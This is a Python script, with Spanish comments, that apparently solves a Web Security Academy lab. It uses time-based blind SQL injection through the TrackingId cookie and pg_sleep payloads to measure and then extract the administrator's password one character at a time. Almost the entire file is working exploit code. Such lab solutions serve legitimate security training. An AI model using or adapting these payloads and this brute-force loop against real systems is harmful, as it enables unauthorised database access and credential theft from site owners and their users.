#!/usr/bin/python3

from pwn import *

import requests, signal, time, pdb, sys, string

def def_handler(sig, frame):
    print("\n\n Saliendo...\n")
    sys.exit(1)

#Ctrl + C
signal.signal(signal.SIGINT, def_handler)

main_url = "https://0ad700420419165b83613df7006000bc.web-security-academy.net/"
tracking_id = "Eg3cPwArdgk6iDmV"
session = "ByNKpO5EeVipgzJnFCWA7jNEVjRhunZZ"
characters = string.ascii_lowercase + string.digits

def password_lenght_request():
    counter = 0
    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando ataque longitud contraseña...")
    p2 = log.progress('Longitud Contraseña')
    while True:
            cookies = {
                'TrackingId': f"{tracking_id}'||(SELECT CASE WHEN '1' = '1' THEN pg_sleep(2) ELSE pg_sleep(0) END FROM users WHERE username='administrator' AND LENGTH(password) > {counter})||'",
                'session': f'{session}'
            }
            p1.status(cookies['TrackingId'])
            time_started = time.time()
            r = requests.get(main_url, cookies=cookies)
            time_end = time.time()
            p2.status(counter)
            if (time_end - time_started) > 2:
                counter += 1
            else:
                break
    p2.success(counter)
    return counter

def make_request(longitud_contraseña):
    password = ''
    p1 = log.progress("Fuerza bruta")
    p1.status('Iniciando el ataque de fuerza bruta')

    time.sleep(2)

    p2 = log.progress('Password')
    for position in range(1, longitud_contraseña + 1):
        for character in characters:
            cookies = {
                'TrackingId': f"{tracking_id}'||(SELECT CASE WHEN SUBSTR(password,{position},1)='{character}' THEN pg_sleep(3) ELSE pg_sleep(0) END FROM users WHERE username='administrator')||'",
                'session': f'{session}'
            }
            p1.status(cookies['TrackingId'])
            p2.status(password)
            time_started = time.time()
            r = requests.get(main_url, cookies=cookies)
            time_end = time.time()
            if (time_end - time_started) > 3:
                password += character
                p2.status(password)
                break


if __name__ == "__main__":
    #longitud_contraseña = password_lenght_request()
    make_request(20)
